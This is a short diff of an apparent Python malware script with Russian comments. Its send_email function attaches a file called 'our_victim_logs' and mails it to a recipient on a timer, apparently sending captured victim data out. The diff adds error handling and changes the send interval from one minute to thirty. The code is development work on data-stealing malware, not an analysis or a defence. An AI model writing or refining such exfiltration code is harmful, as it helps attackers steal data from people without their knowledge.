@@ -34,21 +34,27 @@ def send_email(file_path):
     # Присоединяем текстовое сообщение
     msg.attach(MIMEText("См. вложение для логов.", 'plain'))
 
-    # Открываем файл и прикрепляем его как вложение
-    with open(file_path, "rb") as file:
-        part = MIMEApplication(file.read())
-        part.add_header('Content-Disposition', 'attachment', filename="our_victim_logs")
-        msg.attach(part)
+    # обработчик ошибок
+    try:
+
+        # Открываем файл и прикрепляем его как вложение
+        with open(file_path, "rb") as file:
+            part = MIMEApplication(file.read())
+            part.add_header('Content-Disposition', 'attachment', filename="our_victim_logs")
+            msg.attach(part)
+            print('Файл успешно отправлен!')
+
+    except FileNotFoundError:     # если файл не найден
+        print(f'Файл {file_path} не найден')
 
     server.sendmail(sender, recipient, msg.as_string())
-    print('Файл успешно отправлен!')
     main_ecrp()
     server.quit()
 
 
 # Функция выполнения расписания
 def run_schedule(file_path):
-    schedule.every(1).minutes.do(send_email, file_path)
+    schedule.every(30).minutes.do(send_email, file_path)
 
     while True:
         schedule.run_pending()
